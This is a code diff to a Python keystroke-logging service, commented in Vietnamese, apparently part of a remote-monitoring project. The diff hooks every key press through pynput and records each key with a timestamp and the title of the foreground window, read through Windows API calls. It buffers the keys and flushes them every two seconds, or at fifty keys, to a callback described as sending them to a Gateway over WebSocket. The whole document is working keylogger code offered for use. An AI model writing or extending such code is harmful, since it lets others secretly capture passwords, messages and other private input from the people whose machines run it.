@@ -9,13 +9,35 @@ ARCHITECTURE ROLE:
 ===============================================================================
 """
 
+import ctypes
+from ctypes import wintypes
 import logging
 import threading
 import time
-from typing import Callable, Optional
+from typing import Callable, List, Dict, Any, Optional
 from pynput import keyboard
 
 logger = logging.getLogger("KeyloggerModule")
+
+_user32 = ctypes.windll.user32
+
+# Xả buffer mỗi 2 giây (hoặc khi đạt 50 phím) theo docs/api_contract.md
+FLUSH_INTERVAL_SECONDS = 2.0
+FLUSH_MAX_BUFFER = 50
+
+
+def _get_active_window_title() -> str:
+    """Lấy tiêu đề cửa sổ đang được focus (để đính kèm vào keylogger.data)."""
+    try:
+        hwnd = _user32.GetForegroundWindow()
+        length = _user32.GetWindowTextLengthW(hwnd)
+        if length == 0:
+            return ""
+        buffer = ctypes.create_unicode_buffer(length + 1)
+        _user32.GetWindowTextW(hwnd, buffer, length + 1)
+        return buffer.value
+    except Exception:
+        return ""
 
 
 class KeyloggerService:
@@ -26,17 +48,19 @@ class KeyloggerService:
     def __init__(self):
         self.is_logging: bool = False
         self._listener: Optional[keyboard.Listener] = None
-        self._buffer: str = ""
+        # Mỗi phần tử: {"key": str, "timestamp": int} — khớp payload.entries theo api_contract.md
+        self._buffer: List[Dict[str, Any]] = []
         self._lock = threading.Lock() # Lock giúp đảm bảo an toàn đa luồng (Thread-Safety)
         self._flush_thread: Optional[threading.Thread] = None
-        self._on_flush_callback: Optional[Callable[[str], None]] = None
+        self._on_flush_callback: Optional[Callable[[List[Dict[str, Any]], str], None]] = None
 
-    def start_logging(self, on_flush_callback: Callable[[str], None]):
+    def start_logging(self, on_flush_callback: Callable[[List[Dict[str, Any]], str], None]):
         """
         Khởi chạy Dịch vụ Lắng nghe Bàn phím.
-        
+
         Args:
-            on_flush_callback: Hàm nhận chuỗi văn bản gõ phím để gửi về Gateway.
+            on_flush_callback: Hàm nhận (entries, window_title) để gửi về Gateway
+                                dưới dạng message keylogger.data.
         """
         if self.is_logging:
             logger.warning("⚠️ Keylogger đã đang trong trạng thái hoạt động!")
@@ -44,13 +68,13 @@ class KeyloggerService:
 
         self.is_logging = True
         self._on_flush_callback = on_flush_callback
-        self._buffer = ""
+        self._buffer = []
 
         # 1. Bắt đầu Listener Hook từ pynput
         self._listener = keyboard.Listener(on_press=self._on_key_press)
         self._listener.start()
 
-        # 2. Mở Thread ngầm định kỳ xả Buffer (Flush Buffer) mỗi 3 giây
+        # 2. Mở Thread ngầm định kỳ xả Buffer (Flush Buffer) mỗi FLUSH_INTERVAL_SECONDS giây
         self._flush_thread = threading.Thread(target=self._periodic_flush_loop, daemon=True)
         self._flush_thread.start()
 
@@ -78,40 +102,40 @@ class KeyloggerService:
         """
         Callback xử lý mỗi khi có 1 phím được bấm down.
         """
-        char_to_append = ""
+        key_label = ""
 
         try:
             # Ký tự phím thường (a-z, 0-9, symbol)
             if hasattr(key, 'char') and key.char is not None:
-                char_to_append = key.char
+                key_label = key.char
             else:
                 # Phím chức năng đặc biệt
                 if key == keyboard.Key.space:
-                    char_to_append = " "
+                    key_label = "SPACE"
                 elif key == keyboard.Key.enter:
-                    char_to_append = "\n[ENTER]\n"
+                    key_label = "ENTER"
                 elif key == keyboard.Key.backspace:
-                    char_to_append = "[BACKSPACE]"
+                    key_label = "BACKSPACE"
                 elif key == keyboard.Key.tab:
-                    char_to_append = "[TAB]"
+                    key_label = "TAB"
                 # Bỏ qua các phím điều khiển khác như Shift, Ctrl, Alt để tránh rác log
         except Exception:
             pass
 
-        if char_to_append:
+        if key_label:
             with self._lock:
-                self._buffer += char_to_append
-                
-                # Nếu buffer vượt quá 50 ký tự, xả ngay lập tức không cần đợi 3s
-                if len(self._buffer) >= 50:
+                self._buffer.append({"key": key_label, "timestamp": int(time.time())})
+
+                # Nếu buffer đạt 50 phím, xả ngay lập tức không cần đợi FLUSH_INTERVAL_SECONDS
+                if len(self._buffer) >= FLUSH_MAX_BUFFER:
                     self._flush_buffer_unsafe()
 
     def _periodic_flush_loop(self):
         """
-        Thread ngầm tự động xả Buffer mỗi 3 giây.
+        Thread ngầm tự động xả Buffer mỗi FLUSH_INTERVAL_SECONDS giây.
         """
         while self.is_logging:
-            time.sleep(3.0)
+            time.sleep(FLUSH_INTERVAL_SECONDS)
             self.flush_buffer()
 
     def flush_buffer(self):
@@ -126,12 +150,13 @@ class KeyloggerService:
         Hàm xả Buffer nội bộ (Cần gọi trong khối with self._lock).
         """
         if self._buffer and self._on_flush_callback:
-            data_to_send = self._buffer
-            self._buffer = "" # Reset buffer về rỗng
-            
+            entries_to_send = self._buffer
+            self._buffer = []  # Reset buffer về rỗng
+            window_title = _get_active_window_title()
+
             # Đẩy dữ liệu ra Callback gửi qua WebSocket
             try:
-                self._on_flush_callback(data_to_send)
+                self._on_flush_callback(entries_to_send, window_title)
             except Exception as e:
                 logger.error(f"❌ Lỗi gửi dữ liệu Keylogger qua callback: {str(e)}")
 
